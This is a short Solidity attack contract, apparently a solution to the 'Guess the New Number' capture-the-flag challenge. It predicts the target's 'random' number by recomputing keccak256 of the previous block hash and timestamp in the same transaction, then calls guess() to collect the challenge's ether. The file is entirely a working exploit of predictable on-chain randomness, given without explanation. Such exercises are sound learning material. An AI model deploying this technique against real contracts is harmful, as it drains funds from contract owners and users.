// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

import "./GuessTheNewNumberChallenge.sol";

contract Attack {
    GuessTheNewNumberChallenge src;

    constructor(address _src) {
        src = GuessTheNewNumberChallenge(_src);
    }

    function attack() public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        src.guess.value(msg.value)(answer);
        require(address(this).balance == 2 ether);
    }

    function() payable {}
}
